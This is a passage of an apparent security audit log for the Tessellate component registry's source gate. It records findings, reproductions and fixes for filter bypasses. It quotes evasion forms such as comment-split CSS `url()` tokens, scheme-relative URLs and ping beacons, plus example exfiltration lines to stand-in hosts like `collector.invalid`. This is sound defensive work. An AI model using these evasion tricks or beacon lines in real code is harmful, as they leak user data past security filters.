avigator.credentials`, `cookieStore`, IndexedDB, and Cache Storage. After reads were fixed, additional probes found `Reflect.set(document, 'cookie', ...)`, `Object.defineProperty`, and `Object.assign` writes were also accepted. Regressions failed before each fix. These are static source probes; no submitted resource code ran. See [`credential-storage regression`](evidence/step-37/registry-credential-storage-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "browser credential storage access"`. Before the fix, computed cookie access returned `pass`; after the fix, all covered direct, computed, aliased, destructured, and reflected forms return `fail`.

**Root cause:** Credential protection used direct text matches for `document.cookie` and calls to `localStorage` or `sessionStorage` with literal credential-like keys. It did not model the storage/credential objects through TypeScript AST member resolution, aliases, destructuring, or reflected reads and writes.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** The static source gate now rejects access to browser cookies, local/session storage, Cache Storage, IndexedDB, and the browser credential API. It follows computed members, aliases, destructured browser properties, reflected property values, descriptor getters, and reflected mutations of sensitive browser roots; unknown reflected names on browser/document/navigator roots fail closed. This complements the independent opaque-origin preview sandbox and CSP.

**Validation:** Red-to-green registry regression passed, focused registry suite 55/55, full unit suite 1,180 tests across 76 files, typecheck across all 22 workspace packages, lint with zero errors and 33 existing warnings (zero warnings in changed files), and `pnpm audit:all` passed all 16 behavioral gates, production builds, bundle budgets, provenance/security audits, and dependency audit. The repeatable source-isolation matrix scanned all 324 canonical resources: 324 pass, zero warnings, zero failures. Browser E2E was not repeated because this change only modifies static admission analysis; the earlier 431 pass / 134 configured skips result remains prior local runtime evidence. Deployment verification remains pending for Step 45.

### SEC-37-088 — High — script elements could be created through DOM factory aliases

**Evidence:** The registry gate returned `pass` for script elements created using a concatenated tag name, an aliased `document.createElement`, and an aliased `document.createElementNS`. The regression parsed source only; no resource code ran. See [`script factory regression`](evidence/step-37/registry-dynamic-script-factory-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "scripts created through computed and aliased DOM element factories"`. Before the fix, each factory form was admitted.

**Root cause:** Static script checks covered literal script tags but did not identify script nodes materialized through computed or aliased DOM factory calls.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve aliased `createElement`/`createElementNS` calls and computed tag names, then reject script elements at registry admission.

**Validation:** The red regression now passes. The registry suite passes 59/59; the 324-resource source-isolation matrix passes with zero warnings or failures. Full unit, typecheck, lint, and aggregate results are recorded in `verification.json`. The public deployment still requires release-candidate verification.

### SEC-37-089 — High — programmatic iframe creation bypassed the static sandbox boundary

**Evidence:** Direct, aliased, and namespace-aware DOM factories could create iframe elements and then assign `sandbox` and `src` properties; the gate returned `pass`. See [`programmatic iframe regression`](evidence/step-37/registry-programmatic-iframe-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "programmatically created iframe elements"`. The probes cover direct creation, aliasing with later sandbox mutation, and `createElementNS`.

**Root cause:** The gate checked statically authored iframe attributes but could not track whether a programmatically created frame stayed sandboxed as its attributes and navigation changed.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Reject iframe elements created programmatically by registry resources. The supported preview remains in Tessellate's separately controlled opaque-origin host.

**Validation:** The red regression now passes in the 59/59 registry suite. The canonical resource scan found no programmatically created iframe elements; deployed release-candidate verification remains pending.

### SEC-37-090 — High — browser HTML parsing APIs bypassed markup isolation

**Evidence:** The gate accepted `Range.createContextualFragment`, `DOMParser.parseFromString`, and `Element.setHTMLUnsafe`, including bound, destructured, and reflected forms. The safe `Element.setHTML` path remains allowed. See [`HTML parser sink regression`](evidence/step-37/registry-html-parser-sinks-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "browser HTML parsing sinks"`. Each unsafe parser returned `pass` before the fix.

**Root cause:** The scanner covered common React/DOM raw-HTML sinks but omitted indirect and newer browser APIs that materialize markup from strings.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Classify contextual fragments, DOMParser parsing, and `setHTMLUnsafe` as markup injection sinks through aliases and reflection, while retaining the tested safe `setHTML` path.

**Validation:** Red-to-green regressions pass in the 59/59 registry suite. These were static probes, not runtime execution. Release-candidate deployment verification remains pending.

### SEC-37-091 — High — React element factory APIs bypassed native-node and remote-resource checks

**Evidence:** `React.createElement`, named `createElement` imports, and `react/jsx-runtime` factories could construct script/iframe nodes or remote image requests while passing the gate. External anchor navigation and local image assets are confirmed safe. See [`React factory regression`](evidence/step-37/registry-react-element-factory-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "unsafe native resources passed through React element factories"`. The script, iframe, and remote-image cases were accepted before the fix.

**Root cause:** Native resource and URL checks primarily visited JSX nodes; React factory calls encode equivalent DOM output as call expressions.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve React and JSX-runtime element factories and apply the same tag and resource-prop checks as JSX, preserving safe external anchors and local asset paths.

**Validation:** The red regression passes in the 59/59 registry suite, and the full unit suite passes 1,184 tests across 76 files. Typecheck covers all 22 packages, lint has zero errors and 33 existing warnings, `pnpm audit:all` passes 16/16 gates, and the 324-resource source-isolation matrix has zero warnings/failures. E2E was not rerun because these findings changed static registry admission only. Public deployment verification remains pending for Step 45.

### SEC-37-092 — Medium — JSX and React prop spreads hid remote resource requests

**Evidence:** The gate returned `pass` for external asset URLs supplied through JSX spread attributes, React factory object spreads, unresolved runtime image props, and a spread descriptor passed to `Object.defineProperty`. These source probes were parsed but never executed. See [`spread resource props regression`](evidence/step-37/registry-spread-resource-props-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "hidden in JSX and React factory prop spreads"`. Before the fix, the static remote JSX spread returned `pass`; direct probes also returned `pass` for React spreads and unresolved spreads.

**Root cause:** The JSX visitor skipped `JsxSpreadAttribute`, and the React factory/property-descriptor scanner only read direct object properties. These paths did not resolve object spread assignments or fail closed for an unknown spread on an automatically loading resource tag.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Resolve static spread properties and const aliases for JSX props, React factory props, and DOM property descriptors. Reject static remote URLs and unresolved spreads that could supply a URL to an auto-loading resource element. Keep external anchors and form controls under their existing behavior and CSP constraints.

**Validation:** The regression passes in the latest 65/65 registry suite. After SEC-37-097, full unit tests pass 1,190 tests across 76 files; all 22 packages typecheck; lint has zero errors and 33 existing warnings; `pnpm audit:all` passes 16/16 gates. The canonical source-isolation matrix passes all 324 resources with zero warnings/failures. E2E was not rerun after SEC-37-092 through SEC-37-097 because those changes affect static registry admission only. Deployed verification remains pending.

### SEC-37-093 — Medium — unresolved React intrinsic tags bypassed native-element checks

**Evidence:** `React.createElement(resolveTag(), ...)` returned `pass` when TypeScript could not determine whether the factory tag was a native string or a custom component. The scanner treated an empty tag resolution as safe. See [`dynamic React tag regression`](evidence/step-37/registry-dynamic-react-tag-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "unresolved intrinsic tag"`. The string-typed tag passed before the fix.

**Root cause:** Factory inspection applied script, iframe, and resource checks only to resolved tag names. It did not distinguish a certified custom component type from an unresolved string/any/unknown intrinsic type.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Consult the TypeScript type checker and reject unresolved factory types that could be native string tags. Statically known custom component types remain supported.

**Validation:** The red regression passes in the latest 65/65 registry suite; the 324-resource scan reports zero security failures. After SEC-37-097, full unit tests pass 1,190 tests across 76 files, all 22 packages typecheck, lint has zero errors and 33 existing warnings, and `pnpm audit:all` passes 16/16 gates. E2E was not rerun after SEC-37-092 through SEC-37-097 because those changes affect static registry admission only. Deployed verification remains pending.

### SEC-37-094 — Medium — protocol-relative CSS URLs bypassed remote asset detection

**Evidence:** CSS background and `@font-face` declarations using `url(//collector.invalid/...)` returned `pass`; browsers resolve these URLs against the current scheme and load them remotely. CSS hex escapes can encode the same protocol-relative slashes and were added to the regression. See [`protocol-relative CSS regression`](evidence/step-37/registry-protocol-relative-css-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "protocol-relative remote CSS"`. Both protocol-relative examples passed before the fix.

**Root cause:** The CSS URL detector required an explicit `http://` or `https://` prefix.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Normalize CSS hex/simple escapes before matching scheme-relative `//` and explicit HTTP/HTTPS URLs.

**Validation:** Both regressions pass in the latest 65/65 registry suite. After SEC-37-097, the complete unit suite passes 1,190 tests across 76 files; typecheck covers 22 packages; lint has zero errors and 33 existing warnings; `pnpm audit:all` passes 16/16 gates, production builds and budget/provenance/security checks; the source matrix passes 324/324 with zero warnings/failures. E2E was not rerun after SEC-37-092 through SEC-37-097 because those changes affect static registry admission only. Deployment verification remains pending for Step 45.

### SEC-37-095 — Medium — Object.assign bypassed DOM resource mutation checks

**Evidence:** Direct, aliased, namespace-aware, and unresolved-source `Object.assign` calls could add remote `src`/`href` values to DOM-created resource nodes while the gate returned `pass`. See [`Object.assign resource regression`](evidence/step-37/registry-object-assign-resource-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "remote resource mutations through Object.assign"`. The direct `img.src` case passed before the fix.

**Root cause:** Resource mutation analysis covered `setAttribute`, `Reflect.set`, and `Object.defineProperty`, but not `Object.assign` source objects.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Inspect Object.assign targets and source properties; resolve aliases/spreads, reject static remote values, and fail closed when an unknown source can set a URL on an automatically loading resource element.

**Validation:** The 65/65 registry suite and 324-resource source-isolation scan pass with zero findings. The full repository validations are recorded in `verification.json`. Release-candidate verification remains pending.

### SEC-37-096 — Medium — SVG feImage resource requests bypassed tag classification

**Evidence:** Both `<feImage href="https://...">` and a React `feImage` factory returned `pass`. The SVG tag is case-sensitive in JSX, and its `href` triggers an external asset load. See [`SVG feImage regression`](evidence/step-37/registry-svg-feimage-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "remote SVG feImage resources"`.

**Root cause:** The JSX scanner accepted only lowercase intrinsic names and the resource URL map omitted SVG `feImage`.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Normalize the known case-sensitive `feImage` intrinsic to `feimage` and apply the resource `href` checks to JSX and React factories.

**Validation:** JSX and React factory regressions pass in the 65/65 suite; the 324-resource matrix remains clean. Deployed verification remains pending.

### SEC-37-097 — Medium — automatic meta refresh navigation was not rejected

**Evidence:** JSX, React factory, and DOM mutation forms of `httpEquiv="refresh"` passed the gate and can automatically navigate the preview frame. Static source probes did not mount a meta element or perform a redirect. See [`meta refresh regression`](evidence/step-37/registry-meta-refresh-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "automatic meta refresh navigation"`.

**Root cause:** The gate checked resource URL attributes and location APIs but did not classify the meta refresh directive.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Reject known or unresolved meta refresh directives in JSX, React factory props, and direct DOM mutation paths.

**Validation:** JSX, React factory, property assignment, `setAttribute`, and `Object.assign` regressions pass in the 65/65 suite. The source matrix and release-candidate browser verification remain tracked separately.

### SEC-37-098 — Medium — CSS comments bypassed remote URL token detection

**Evidence:** The gate accepted protocol-relative CSS requests when comments split the `url()` token or separate it from the opening parenthesis, including `url/**/(//collector.invalid/...)` and `u/**/rl(//collector.invalid/...)`. See [`CSS comment tokenization regression`](evidence/step-37/registry-css-comment-tokenization-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "protocol-relative remote CSS"`. Both comment-obfuscated forms returned `pass` before the fix.

**Root cause:** CSS block comments are removed before tokenization, but the lexical URL detector normalized escapes without removing comments.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Remove CSS block comments from normalized scan text before matching remote `url()` values.

**Validation:** The regression failed before the fix and now passes in the 65-test registry suite. Only static source analysis ran; deployed CSP verification remains pending.

### SEC-37-099 — Medium — scheme-only HTTP(S) CSS URLs bypassed external request detection

**Evidence:** The gate accepted scheme-only `http:` and `https:` URLs, including CSS-escaped colons. URL parsing confirms `http:collector.invalid/pixel` resolves externally from an HTTPS preview and `https:collector.invalid/pixel` resolves externally from an HTTP preview. See [`CSS scheme delimiter regression`](evidence/step-37/registry-css-scheme-colon-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "protocol-relative remote CSS"`. The direct and escaped HTTP and HTTPS scheme-only examples returned `pass` before the fix.

**Root cause:** The CSS detector required `http://` or `https://` and missed special-scheme forms without slashes after escape normalization.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Reject normalized HTTP and HTTPS schemes in CSS `url()` functions regardless of following slashes, alongside protocol-relative requests.

**Validation:** Direct and escaped HTTP and HTTPS scheme-only regressions failed before the fix. They now pass in the focused registry test. A browser probe confirmed scheme-only HTTPS requests can reach an external origin from an HTTP preview. No contributed component code was executed; deployed CSP verification remains pending.

### SEC-37-100 — Medium — scheme-relative and scheme-only resource URLs bypassed network admission checks

**Evidence:** The source gate returned `pass` for `img src="//collector.invalid/pixel"`, video poster URLs, a later remote `srcset` candidate, and scheme-only HTTP(S) URLs in React/DOM forms. Chromium on an HTTP preview origin requested both `http://collector.invalid/pixel` for the protocol-relative URL and `https://collector.invalid/pixel` for `https:collector.invalid/pixel`; Playwright intercepted and aborted both. See [`resource URL forms regression`](evidence/step-37/registry-resource-url-forms-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "scheme-relative and scheme-only forms"`. The first JSX protocol-relative image returned `pass` before the fix.

**Root cause:** Resource-attribute analysis used a strict `https?://` matcher and did not parse every candidate in `srcset`.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Share a normalized HTTP(S)/scheme-relative URL classifier across JSX, React factories, DOM mutation, constructors and module/network arguments; inspect each `srcset` candidate.

**Validation:** The regression failed before the fix and passes in the 68-test registry suite. The 324-resource source matrix and final full local validations are recorded in `verification.json`. Deployed CSP verification remains pending.

### SEC-37-101 — Medium — link ping attributes enabled hidden outbound beacons

**Evidence:** JSX, React factory and DOM-created links with a `ping` URL passed the gate. A Chromium probe clicked a local link and observed a request to `https://collector.invalid/ping`; Playwright aborted it before network access. See [`link ping regression`](evidence/step-37/registry-link-ping-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "hidden outbound link ping beacons"`. The JSX anchor beacon returned `pass` before the fix.

**Root cause:** `ping` was missing from the gate's URL-attribute set, so anchor and area beacons bypassed static network checks.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and `packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** Treat anchor/area `ping` URL lists as outbound requests across JSX, React factories, spreads and DOM mutation paths.

**Validation:** The regression failed before the fix and passes in the 68-test registry suite. The browser request was intercepted and aborted. Deployed CSP verification remains pending.

### SEC-37-102 — Medium — the Link resource forwarded caller-supplied ping beacons

**Evidence:** After the gate began checking `ping`, the fresh 324-resource matrix correctly stopped certifying Link because its `...rest` anchor spread could forward a caller-supplied hidden beacon. The earlier Chromium probe for SEC-37-101 demonstrated that activating such a link emits an outbound request, which Playwright intercepted and aborted. See [`Link ping sanitization`](evidence/step-37/registry-link-component-ping-sanitization.json).

**Reproduction:** Run `pnpm exec tsx quality/scripts/audit-registry-source-isolation.ts`. Before the fix, 323 resources passed and `link` failed with “Dynamic native element tags or resource props cannot be certified.” The new regression also failed before the fix because the analyzer could not prove that an explicit rest-binding exclusion removed `ping`.

**Root cause:** The public Link primitive spread all remaining `AnchorHTMLAttributes`, which includes the hidden `ping` request attribute.

**Affected code:** `resources/primitives/link/index.tsx`, `packages/registry-gate/src/checks/isolation-check.ts`, `packages/registry-gate/src/__tests__/registry-gate.test.ts`, and generated `apps/site/public/r/link.json`.

**Remediation:** Remove `ping` from Link's public type, discard any runtime `ping` value before forwarding anchor props, and let the source checker certify a rest binding only when the requested property is explicitly excluded. Unfiltered dynamic ping spreads still fail closed.

**Validation:** The targeted red-to-green regression passes; the full 70-test registry suite and 1,195-test workspace suite pass; `pnpm build:catalog` validates all 324 resources; and the source matrix reports 324 pass, 0 warn, 0 fail. See `verification.json` for the final integrated build, typecheck, lint, budget, provenance, secret and dependency results. Deployed CSP verification remains pending.

### SEC-37-103 — Medium — preview CSP did not explicitly restrict form submission destinations

**Evidence:** The preview CSP included `default-src 'none'` but no `form-action` directive. An adversarial Playwright test inserted a POST form targeting `collector.invalid` with a sample employee field. The browser emitted no external request because the existing opaque preview sandbox has `sandbox allow-scripts` and does not permit forms, but the missing directive left a second security boundary implicit. See [`preview form-action CSP regression`](evidence/step-37/preview-form-action-csp-regression.json).

**Reproduction:** Run `pnpm exec playwright test --config tests/e2e/sites-preview.playwright.config.ts tests/e2e/sites-preview-csp.spec.ts -g "preview CSP blocks forms"`. Before the fix, the test failed because the response policy omitted `form-action 'none'`; its request observer confirmed that the sandbox still blocked the attempted submission.

**Root cause:** The preview policy relied on sandboxing and assumed `default-src` also covered form submissions.

**Affected code:** `apps/sites/worker.ts`, `apps/site/public/_headers`, `apps/preview/public/_headers`, and the CSP regression in `tests/e2e/sites-preview-csp.spec.ts`.

**Remediation:** Explicitly deny form submissions in preview hosts and restrict the main Site shell to same-origin form targets. The opaque sandbox remains active. The W3C CSP specification states that `form-action` does not fall back to `default-src` ([CSP Level 2](https://www.w3.org/TR/CSP/latest/)).

**Validation:** The same browser test passes for desktop Chromium and the mobile Chromium profile, observes no intercepted external request, and verifies the response contains `form-action 'none'`. This is defense in depth: the sandbox already blocked the test submission before the header change.

### SEC-37-104 — Medium — registry admission allowed unresolved form and beacon destinations

**Evidence:** The gate passed forms that spread caller-supplied action props and controls with dynamic `formAction` or anchor `ping` values. The new source regression failed before the fix. The browser submission probe remained blocked by the preview sandbox, so no data left the browser. See [`dynamic form destination regression`](evidence/step-37/registry-dynamic-form-target-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "unresolved form destinations in forwarded resource props"`. Before the fix, the first form spread returned `pass`.

**Root cause:** The gate treated submit-time form destinations and ping beacons as non-automatic, so it did not require their values to be statically certified.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts`, its regression suite, and shared Link/Button/IconButton/Input/PasswordInput/SearchInput resource primitives.

**Remediation:** Fail closed for unresolved `action`, `formAction`, and `ping` attributes in JSX, React factories, spreads, and DOM mutations. Remove those transport attributes from the shared primitive contracts and strip runtime props before forwarding.

**Validation:** The red-to-green regression passes for JSX, React factory, and DOM mutation forms. The full registry suite passes 70 tests and the 324-resource isolation matrix reports 324 pass, 0 warn, 0 fail. The production build regenerates the public resource artifacts.

### SEC-37-105 — Medium — registry admission accepted dynamic iframe srcDoc payloads

**Evidence:** The gate passed a JSX iframe with `sandbox="allow-scripts"` and a dynamic `srcDoc` HTML value. The preview runtime already blocks nested frames with `frame-src 'none'`, and a Chromium probe confirmed the embedded script does not run in the Sites preview. The missing source-level check left this construct uncertified in other registry consumers. See [`iframe srcDoc regression`](evidence/step-37/registry-iframe-srcdoc-regression.json).

**Reproduction:** Run `pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts -t "dynamic iframe srcDoc payloads"`. Before the fix, the dynamic JSX example returned `pass`.

**Root cause:** The iframe gate checked the sandbox attribute and source URL but did not inspect `srcDoc` or dynamic iframe document writes.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts`, its regression suite, and the preview isolation test in `tests/e2e/sites-preview-csp.spec.ts`.

**Remediation:** Reject explicit or unresolved iframe `srcDoc` values and direct `srcdoc` property, attribute, and descriptor writes. Preserve the Sites preview `frame-src 'none'` policy and opaque outer sandbox.

**Validation:** The 70-test registry suite passes, and four focused preview CSP/isolation browser cases pass across desktop and mobile Chromium. Coverage includes JSX, direct assignment, `setAttribute`, and `Object.defineProperty`; the nested frame's message is not received, the external request list remains empty, and CSP reports the frame block. The full workspace suite passes 1,195 tests across 76 files. Deployed verification remains pending.

## Open audit work

Do not mark Step 37 complete yet. D1-backed API checks now cover malformed JSON

on ten mutation routes and unauthenticated access on nineteen private routes;

existing regressions cover cross-account access and corrupted stored records.

A local D1-backed pressure smoke also passed 60 concurrent public reads across

published projects, public collections, and creator links, with every response

under the 2 MiB ceiling. Remaining checks include the broader hostile

registry/resource audit beyond the new lexical and symlink containment, slug,

and source-directory provenance regressions and the tested network and storage isolation;

tunnel startup, computer restart, and external deployment verification. The

dedicated host container restart now completes a fresh inference job and both

Tessellate Docker containers return to healthy status. The existing

review Site passed opaque-origin and parent-data

isolation checks but still serves the old broad script/style policy; a desktop

browser probe confirmed arbitrary inline script execution. The local Worker now

blocks that script. Repeat the CSP scope and injection check after the later

review deployment.

The ten configured rate-limit namespace IDs are locally unique across the API

and laptop-backend Workers. Wrangler 4.92.0 is available from the Sites/API

packages, but `wrangler whoami` confirms this session is unauthenticated, so

existence in the target Cloudflare account remains unverified. See

`quality/evidence/step-37/rate-limit-namespace-auth-check.json`. MCP SSE

session churn is covered locally by 24 sequential connect/list/close cycles. Gateway-secret behavior is

covered locally across disconnected Sites, missing backend gateway, wrong

gateway credential, authenticated proxy, and separate host-worker credential;

deployed release-candidate verification remains pending.

The last full local browser run passed 431 tests with 134 configured skips and

zero failures before the SEC-37-100 through SEC-37-105 registry and CSP changes.

It rechecked catalogue resources, variants, flagship workflows, responsive and

accessibility behavior, and local preview/public-shell CSP. After the security

changes, 1,195 unit tests, typecheck, lint, integrated audit/build, catalogue

generation, and the 324-resource isolation matrix passed. Four focused Playwright

form-action and nested-frame isolation cases passed across desktop and mobile

Chromium; no external request was observed. The full browser suite and deployed

review Site have not yet been rerun for these changes. Cloudflare account,

tunnel-startup, and computer-restart checks remain open. Step 38 trace-based Core

Web Vitals work is paused pending Chrome DevTools MCP setup at the owner's request.

### 2026-10-21 full-suite reliability follow-up

The first full `pnpm test` after the current browser work timed out the exhaustive Gold admission/symlink test at its 5-second default while it enumerated the 324-resource catalogue under concurrent test load; the same test passed alone in 3.28 seconds. Its assertions were unchanged and its specific timeout is now 15 seconds. The rerun passed 76/76 files and 1,195/1,195 tests in 83.52 seconds. Evidence is `quality/evidence/step-37/gold-artifact-timeout-regression.json`. The full E2E rerun after the homepage hydration correction also completed successfully; this is local verification only. Cloudflare namespace authentication, tunnel startup/computer restart, and published-site verification remain open.

### 2026-10-21 reproducible hostile-resource audit

The 324-resource source-isolation check is now a repeatable command and part of `pnpm audit:all`: `pnpm audit:resource-isolation`. The latest run scanned 324 resources, passed all 324 security-isolation checks, skipped no symlinks, and wrote `quality/evidence/step-37/registry-source-isolation-latest.json`. Community source is statically parsed and never executed. The registry package command was also repaired after the filtered invocation reported “No test files found”; `pnpm --filter @tessellate/registry-gate test` now passes 70/70. Before/after evidence is `quality/evidence/step-37/registry-gate-package-test-command.json`. This does not close deployed CSP, tunnel, Cloudflare account, or broader live hostile-preview checks.

### Acceptance instrumentation cleanup

The Workbench no longer exposes a localhost store global. The flagship acceptance test uses visible controls and exported manifests/ZIPs; desktop and mobile browser runs assert the global is absent. See quality/evidence/step-52/workbench-debug-store-regression.json. This does not replace the pending deployed review-site verification.

### SEC-37-106 — Medium — repeated preview READY messages amplified parent initialization

**Evidence:** The local Sites Worker `/r/button` page embeds its resource in an

opaque sandbox. A browser regression installed a message counter before page

scripts ran, then sent eight repeated `TESSELLATE_PREVIEW_READY` messages from

the frame. Before the fix, the host emitted nine initialization messages: one

for the legitimate readiness event and one for each replay. The regression

also sends a readiness message for a different resource ID. Evidence and

before/after captures are in

[`preview READY replay regression`](evidence/step-37/preview-ready-replay-regression.json).

**Reproduction:** Run the targeted `sites-preview-csp.spec.ts` test against the

Sites Worker. Before the fix, it failed with `Expected: 1, Received: 9`.

**Root cause:** `ResourcePreviewFrame` authenticated the sender by matching the

iframe's `contentWindow` and checked only the message type. It replied to every

READY message, without matching its resource ID or limiting the handshake to

one reply for the current iframe load.

**Affected code:** `apps/site/src/components/ResourcePreviewFrame.tsx` and

`tests/e2e/sites-preview-csp.spec.ts`.

**Remediation:** The host now requires the message resource ID to match the

current manifest and replies only once per iframe load. The guard resets on

the iframe's `load` event so a deliberate variant change can establish a fresh

handshake.

**Validation:** The red-to-green test passed in desktop Chromium at 1440×900

and mobile Chromium at 390×844. It verifies mismatched IDs are ignored, eight

replays yield only one reply, and selecting the Quiet variant produces exactly

one new initialization after reload. The focused preview-CSP suite passes 18/18;

both profiles report zero browser console errors, uncaught exceptions, failed

requests, or HTTP errors. The fix still awaits the release-candidate deployment.

### SEC-37-107 — Medium — Vitest mock registration allowed code injection

**Evidence:** `pnpm audit --json` resolved `@vitest/mocker` 4.1.11 through the

workspace's Vitest installation and reported GitHub advisory

[`GHSA-qxg6-89mg-rqv8`](https://github.com/advisories/GHSA-qxg6-89mg-rqv8). The

advisory describes unauthenticated manual mock registration against a reachable

Vite development server. No published proof of concept or untrusted source was

executed as part of this fix.

**Reproduction:** Run `pnpm audit --json` with Vitest 4.1.11 in the frozen

lockfile. It reports the vulnerable version through root Vitest, three package

test dependencies, and the API's Better Auth dependency path.

**Root cause:** The lockfile resolved a vulnerable patch release even though

the workspace ranges allowed the later security patch.

**Affected files:** `package.json`, the Vitest manifests in

`packages/ingest`, `packages/linter`, and `packages/registry-gate`, and

`pnpm-lock.yaml`.

**Remediation:** Update the workspace to Vitest 4.1.12 and commit the resulting

frozen lockfile. That version serializes manual mock module URLs before

generating source, as documented by the upstream patch.

**Validation:** `pnpm install --frozen-lockfile`, all 1,195 tests, all 22

package typechecks, lint, the 16-point integrated release audit, and the

desktop/mobile preview-CSP browser suite pass. `pnpm audit` reports no known

vulnerabilities. The evidence file is

[`Vitest advisory remediation`](evidence/step-37/vitest-advisories-fixed.json).

### SEC-37-108 — Medium — Vitest mock redirects allowed Windows backslash traversal

**Evidence:** The same `pnpm audit --json` run reported Vitest 4.1.11 affected

by [`GHSA-xp26-3454-mjgp`](https://github.com/advisories/GHSA-xp26-3454-mjgp).

The upstream report describes a Windows-specific backslash traversal that

bypasses the mock redirect path allowlist. The published exploit was not run.

**Reproduction:** The lockfile resolved `@vitest/mocker` 4.1.11, inside the

advisory's `>=4.1.11 <4.1.12` affected range. `pnpm audit --json` reports the

vulnerable paths; the workspace was not exposed as a public Vite server.

**Root cause:** The development test toolchain retained the affected patch

release, whose redirect validation interpreted path separators differently on

Windows.

**Affected files:** The same workspace Vitest manifests and lockfile listed for

SEC-37-107.

**Remediation:** Updating to Vitest 4.1.12 also normalizes backslashes before

the redirect allowlist check, closing this distinct traversal issue.

**Validation:** `pnpm audit` now reports no known vulnerabilities, the frozen

install succeeds, and the full unit, typecheck, lint, production build, and

integrated release gates pass. No public deployment was made for this local

toolchain fix. See

[`Vitest advisory remediation`](evidence/step-37/vitest-advisories-fixed.json).

### SEC-37-109 — Medium — registry gate allowed programmatic external navigation

**Evidence:** A red regression passed a dynamic value from a resource input into

`window.location.assign('https://collector.example.test/?value=' + value)`.

The gate previously returned `pass`; it also accepted unresolved destinations

through `location.replace(destination)` and reflected external navigation

through `Reflect.apply`. A local Sites Worker browser probe at 1440×900 and

390×844 confirmed the public shell's `frame-src` blocks this navigation from

an embedded preview before a request is emitted. The separate top-level

`/preview` route did attempt the same dummy URL; Playwright intercepted and

aborted it before any network traffic left the laptop. No actual user data or

untrusted resource code was used. This confirms the source gate is essential

for the direct-preview context, while the normal embedded product context has

an additional parent-CSP boundary. Details are in

[`programmatic navigation gate`](evidence/step-37/programmatic-navigation-gate.json).

**Reproduction:** Run

`pnpm exec vitest run packages/registry-gate/src/__tests__/registry-gate.test.ts`.

Before the fix, the new cases failed because the scanner checked for executable

schemes but permitted HTTPS and unresolved programmatic destinations. The

regression also verifies the legitimate external anchor remains allowed.

**Root cause:** Registry source validation treated `location.assign` and

`location.replace` as unsafe only when their statically resolved value used an

executable or active-document scheme. Dynamic values and ordinary HTTPS URLs

could navigate the script-enabled opaque preview document. The app shell blocks

that path while embedded, but a directly opened preview has no parent

`frame-src` policy; Chromium also reports
avigate-to` as an unrecognized CSP

directive, so the source gate must reject the code before certification.

**Affected code:** `packages/registry-gate/src/checks/isolation-check.ts` and

`packages/registry-gate/src/__tests__/registry-gate.test.ts`.

**Remediation:** The gate now rejects unresolved or non-fragment programmatic

navigation through `assign`, `replace`, `location.href`, reflected writes, and

`Object.assign(location, ...)`. Fragment-only changes remain valid; external

